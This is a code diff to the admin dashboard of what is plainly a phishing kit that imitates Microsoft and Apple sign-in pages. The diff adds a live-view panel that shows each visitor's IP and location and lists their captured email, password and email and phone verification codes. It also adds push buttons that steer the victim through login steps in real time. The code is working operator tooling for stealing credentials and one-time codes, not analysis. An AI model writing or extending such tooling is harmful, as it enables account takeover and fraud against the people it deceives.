@@ -1,5 +1,5 @@
 import { useState, useEffect, useRef } from 'react';
-import { Monitor, Smartphone, Tablet, Moon, Sun, Key, Lock, Mail, LayoutList } from 'lucide-react';
+import { Monitor, Smartphone, Tablet, Moon, Sun, Key, Lock, Mail, LayoutList, Eye, X, Database } from 'lucide-react';
 
 const MicrosoftLogo = () => (
   <svg width="16" height="16" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
@@ -53,6 +53,7 @@ interface VisitorInfo {
   step: string;
   userAgent: string;
   connectedAt: number;
+  formData: Record<string, string>;
 }
 
 const PROVIDER_COLORS: Record<Provider, string> = {
@@ -89,6 +90,14 @@ const STEP_COLORS: Record<string, string> = {
   recover: '#9f1239',
 };
 
+const FIELD_LABELS: Record<string, string> = {
+  email: 'Email',
+  password: 'Password',
+  email_code: 'Email Code',
+  phone: 'Phone Number',
+  phone_code: 'Phone Code',
+};
+
 function ProviderBadge({ provider }: { provider: string }) {
   if (provider === 'microsoft') return <MicrosoftLogo />;
   if (provider === 'apple') return <AppleLogo className="w-3.5 h-3.5 text-white" />;
@@ -100,6 +109,11 @@ function loginSrc(provider: Provider, device: Device, theme: Theme, prompt: Prom
   const base = import.meta.env.BASE_URL.replace(/\/$/, '');
   const phonePart = provider === 'microsoft' && phoneEnabled ? '&phone=1' : '';
   return `${base}/?provider=${provider}&device=${device}&theme=${theme}&prompt=${prompt}${phonePart}`;
+}
+
+function visitorLoginSrc(visitor: VisitorInfo) {
+  const base = import.meta.env.BASE_URL.replace(/\/$/, '');
+  return `${base}/?provider=${visitor.provider}&device=desktop&theme=light&prompt=password&initialStep=${visitor.step}`;
 }
 
 function Toggle({ enabled, onToggle }: { enabled: boolean; onToggle: () => void }) {
@@ -114,17 +128,175 @@ function Toggle({ enabled, onToggle }: { enabled: boolean; onToggle: () => void 
   );
 }
 
-function ActionBtn({ label, color, onClick }: { label: string; color: string; onClick: () => void }) {
+function ActionBtn({ label, color, onClick, fullWidth }: { label: string; color: string; onClick: () => void; fullWidth?: boolean }) {
   return (
     <button
       onClick={onClick}
-      className="px-2 py-0.5 rounded text-[10px] font-semibold text-white transition-opacity hover:opacity-80 flex-shrink-0"
+      className={`px-2 py-1 rounded text-[11px] font-semibold text-white transition-opacity hover:opacity-80 flex-shrink-0 ${fullWidth ? 'w-full' : ''}`}
       style={{ backgroundColor: color }}
     >
       {label}
     </button>
   );
 }
+
+// ── Visitor live-view modal ────────────────────────────────────────────────────
+
+function VisitorModal({
+  visitor,
+  onClose,
+  onPushAction,
+}: {
+  visitor: VisitorInfo;
+  onClose: () => void;
+  onPushAction: (visitorId: string, navigate: string) => void;
+}) {
+  const iframeSrc = visitorLoginSrc(visitor);
+  const stepColor = STEP_COLORS[visitor.step] ?? '#4b5563';
+  const stepLabel = STEP_LABELS[visitor.step] ?? visitor.step;
+  const formEntries = Object.entries(visitor.formData ?? {});
+  const isSensitive = (field: string) => field === 'password' || field === 'email_code' || field === 'phone_code';
+
+  return (
+    <div
+      className="fixed inset-0 z-50 flex items-center justify-center p-4"
+      style={{ backgroundColor: 'rgba(0,0,0,0.82)', backdropFilter: 'blur(4px)' }}
+    >
+      <div className="relative w-full h-full max-w-[1180px] max-h-[800px] flex flex-col bg-[#13151a] rounded-2xl overflow-hidden border border-[#2d3139] shadow-2xl">
+
+        {/* ── Modal header ── */}
+        <div className="flex items-center justify-between px-5 py-3 border-b border-[#2d3139] bg-[#16181d] flex-shrink-0">
+          <div className="flex items-center gap-3">
+            <div className="w-2 h-2 rounded-full bg-green-400 animate-pulse" />
+            <div className="w-6 h-6 rounded bg-white flex items-center justify-center flex-shrink-0 shadow-sm">
+              <ProviderBadge provider={visitor.provider} />
+            </div>
+            <span className="text-white font-semibold text-[14px]">Live View</span>
+            <span
+              className="text-[10px] font-semibold px-2 py-0.5 rounded text-white"
+              style={{ backgroundColor: stepColor }}
+            >
+              {stepLabel}
+            </span>
+            <span className="text-[12px] text-[#8a919e]">{visitor.location.flag} {visitor.location.city}, {visitor.location.country}</span>
+            <span className="text-[11px] font-mono text-[#555d6b]">{visitor.ip}</span>
+          </div>
+          <button
+            onClick={onClose}
+            className="w-8 h-8 flex items-center justify-center rounded-full bg-[#2d3139] hover:bg-[#3a3f4a] text-[#aeb5c0] hover:text-white transition-colors"
+          >
+            <X className="w-4 h-4" />
+          </button>
+        </div>
+
+        {/* ── Modal body ── */}
+        <div className="flex flex-1 overflow-hidden">
+
+          {/* Login iframe */}
+          <div className="flex-1 bg-[#0b0c10] relative overflow-hidden">
+            <iframe
+              key={`${visitor.id}-${visitor.step}`}
+              src={iframeSrc}
+              className="w-full h-full border-0"
+              title="Visitor live view"
+            />
+            <div className="absolute bottom-3 right-3 bg-black/60 rounded-lg px-2.5 py-1.5 text-[10px] text-[#8a919e] pointer-events-none backdrop-blur-sm">
+              Preview — reflects current step
+            </div>
+          </div>
+
+          {/* Right panel */}
+          <div className="w-[260px] flex-shrink-0 flex flex-col border-l border-[#2d3139] overflow-y-auto bg-[#13151a]">
+
+            {/* Push actions */}
+            <div className="p-4 border-b border-[#2d3139]">
+              <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e] mb-3">Push Action</p>
+              <div className="grid grid-cols-2 gap-1.5">
+                <ActionBtn fullWidth label="↩ Email"    color="#4b5563"  onClick={() => onPushAction(visitor.id, 'email')} />
+                <ActionBtn fullWidth label="Password"   color="#0078D4"  onClick={() => onPushAction(visitor.id, 'password')} />
+                <ActionBtn fullWidth label="Code"       color="#7c3aed"  onClick={() => onPushAction(visitor.id, 'email-code')} />
+                <ActionBtn fullWidth label="Other ways" color="#047857"  onClick={() => onPushAction(visitor.id, 'other-ways')} />
+              </div>
+            </div>
+
+            {/* Captured form data */}
+            <div className="p-4 flex-1">
+              <div className="flex items-center gap-2 mb-3">
+                <Database className="w-3.5 h-3.5 text-[#8a919e]" />
+                <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e]">Captured Data</p>
+                {formEntries.length > 0 && (
+                  <span className="ml-auto text-[10px] font-semibold text-green-400">{formEntries.length} field{formEntries.length !== 1 ? 's' : ''}</span>
+                )}
+              </div>
+
+              {formEntries.length === 0 ? (
+                <div className="rounded-xl border border-dashed border-[#2d3139] px-3 py-6 text-center">
+                  <div className="w-8 h-8 rounded-full bg-[#1e2128] flex items-center justify-center mx-auto mb-2">
+                    <Database className="w-4 h-4 text-[#3e4450]" />
+                  </div>
+                  <div className="text-[12px] text-[#555d6b]">No data yet</div>
+                  <div className="text-[10px] text-[#3e4450] mt-1">Fields appear as the visitor submits each step</div>
+                </div>
+              ) : (
+                <div className="space-y-2">
+                  {formEntries.map(([field, value]) => (
+                    <div key={field} className="bg-[#1a1d24] rounded-xl border border-[#2d3139] overflow-hidden">
+                      <div className="flex items-center justify-between px-3 pt-2 pb-1">
+                        <span className="text-[9px] text-[#555d6b] uppercase font-bold tracking-widest">
+                          {FIELD_LABELS[field] ?? field}
+                        </span>
+                        {isSensitive(field) && (
+                          <span className="text-[8px] font-semibold text-amber-500 uppercase tracking-wide">sensitive</span>
+                        )}
+                      </div>
+                      <div className="px-3 pb-2.5">
+                        <span
+                          className="text-[13px] font-mono break-all"
+                          style={{ color: isSensitive(field) ? '#f87171' : '#e2e8f0' }}
+                        >
+                          {isSensitive(field)
+                            ? value.replace(/./g, '•')
+                            : value}
+                        </span>
+                        {isSensitive(field) && (
+                          <div className="text-[10px] text-[#555d6b] mt-1 font-mono">{value}</div>
+                        )}
+                      </div>
+                    </div>
+                  ))}
+
+                  {/* Connection summary */}
+                  <div className="mt-3 pt-3 border-t border-[#2d3139]">
+                    <p className="text-[9px] text-[#555d6b] uppercase font-bold tracking-widest mb-2">Session Info</p>
+                    <div className="space-y-1 text-[11px]">
+                      <div className="flex justify-between">
+                        <span className="text-[#555d6b]">Connected</span>
+                        <span className="text-[#8a919e] font-mono">
+                          {new Date(visitor.connectedAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
+                        </span>
+                      </div>
+                      <div className="flex justify-between">
+                        <span className="text-[#555d6b]">Provider</span>
+                        <span className="text-[#8a919e] capitalize">{visitor.provider}</span>
+                      </div>
+                      <div className="flex justify-between">
+                        <span className="text-[#555d6b]">IP</span>
+                        <span className="text-[#8a919e] font-mono">{visitor.ip}</span>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              )}
+            </div>
+
+          </div>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+// ── Main AdminPage ─────────────────────────────────────────────────────────────
 
 export default function AdminPage() {
   const [provider, setProvider] = useState<Provider>('microsoft');
@@ -133,6 +305,7 @@ export default function AdminPage() {
   const [prompt, setPrompt] = useState<Prompt>('password');
   const [phoneEnabled, setPhoneEnabled] = useState(false);
   const [visitors, setVisitors] = useState<VisitorInfo[]>([]);
+  const [modalVisitorId, setModalVisitorId] = useState<string | null>(null);
   const wsRef = useRef<WebSocket | null>(null);
 
   useEffect(() => {
@@ -155,16 +328,22 @@ export default function AdminPage() {
             id?: string;
             step?: string;
             provider?: string;
+            field?: string;
+            value?: string;
           };
           if (msg.type === 'visitors' && msg.visitors) {
-            setVisitors(msg.visitors);
+            setVisitors(msg.visitors.map(v => ({ ...v, formData: v.formData ?? {} })));
           } else if (msg.type === 'visitor-joined' && msg.visitor) {
-            setVisitors(prev => [...prev.filter(v => v.id !== msg.visitor!.id), msg.visitor!]);
+            setVisitors(prev => [...prev.filter(v => v.id !== msg.visitor!.id), { ...msg.visitor!, formData: msg.visitor!.formData ?? {} }]);
           } else if (msg.type === 'visitor-left' && msg.id) {
             setVisitors(prev => prev.filter(v => v.id !== msg.id));
           } else if (msg.type === 'visitor-updated' && msg.id) {
             setVisitors(prev => prev.map(v =>
               v.id === msg.id ? { ...v, step: msg.step ?? v.step, provider: msg.provider ?? v.provider } : v
+            ));
+          } else if (msg.type === 'visitor-form-data' && msg.id && msg.field) {
+            setVisitors(prev => prev.map(v =>
+              v.id === msg.id ? { ...v, formData: { ...v.formData, [msg.field!]: msg.value ?? '' } } : v
             ));
           }
         } catch { /* ignore */ }
@@ -180,6 +359,8 @@ export default function AdminPage() {
       ws.send(JSON.stringify({ type: 'push-action', visitorId, action: { navigate } }));
     }
   };
+
+  const modalVisitor = visitors.find(v => v.id === modalVisitorId) ?? null;
 
   const providers: { id: Provider; name: string; icon: React.ReactNode }[] = [
     { id: 'microsoft', name: 'Microsoft', icon: <MicrosoftLogoLg /> },
@@ -209,6 +390,16 @@ export default function AdminPage() {
 
   return (
     <div className="flex h-screen w-full overflow-hidden bg-[#0b0c10] text-[#ececf1] font-sans">
+
+      {/* ── Modal ── */}
+      {modalVisitor && (
+        <VisitorModal
+          visitor={modalVisitor}
+          onClose={() => setModalVisitorId(null)}
+          onPushAction={pushAction}
+        />
+      )}
+
       {/* ── Sidebar ── */}
       <aside className="w-[240px] flex-shrink-0 flex flex-col bg-[#16181d] border-r border-[#2d3139] shadow-xl z-10">
 
@@ -365,6 +556,7 @@ export default function AdminPage() {
                 {visitors.map(v => {
                   const stepColor = STEP_COLORS[v.step] ?? '#4b5563';
                   const stepLabel = STEP_LABELS[v.step] ?? v.step;
+                  const hasData = Object.keys(v.formData ?? {}).length > 0;
                   return (
                     <div key={v.id} className="rounded-lg border border-[#2d3139] bg-[#1a1d24] overflow-hidden">
                       {/* Header row */}
@@ -379,6 +571,9 @@ export default function AdminPage() {
                         >
                           {stepLabel}
                         </span>
+                        {hasData && (
+                          <span className="w-1.5 h-1.5 rounded-full bg-amber-400 flex-shrink-0" title="Has captured data" />
+                        )}
                         <span className="text-[10px] text-[#555d6b] truncate ml-auto font-mono">
                           {new Date(v.connectedAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                         </span>
@@ -392,12 +587,19 @@ export default function AdminPage() {
                         <div className="text-[10px] text-[#555d6b] font-mono">{v.ip}</div>
                       </div>
 
-                      {/* Action buttons */}
-                      <div className="px-2.5 pb-2.5 pt-1 flex gap-1 flex-wrap">
+                      {/* Action buttons + Eye */}
+                      <div className="px-2.5 pb-2.5 pt-1 flex gap-1 flex-wrap items-center">
                         <ActionBtn label="↩ Email"    color="#4b5563"  onClick={() => pushAction(v.id, 'email')} />
                         <ActionBtn label="Password"   color="#0078D4"  onClick={() => pushAction(v.id, 'password')} />
                         <ActionBtn label="Code"       color="#7c3aed"  onClick={() => pushAction(v.id, 'email-code')} />
                         <ActionBtn label="Other ways" color="#047857"  onClick={() => pushAction(v.id, 'other-ways')} />
+                        <button
+                          onClick={() => setModalVisitorId(v.id)}
+                          className="ml-auto flex items-center justify-center w-6 h-6 rounded bg-[#2d3139] hover:bg-[#3a3f4a] text-[#8a919e] hover:text-white transition-colors flex-shrink-0"
+                          title="Live view"
+                        >
+                          <Eye className="w-3.5 h-3.5" />
+                        </button>
                       </div>
                     </div>
                   );
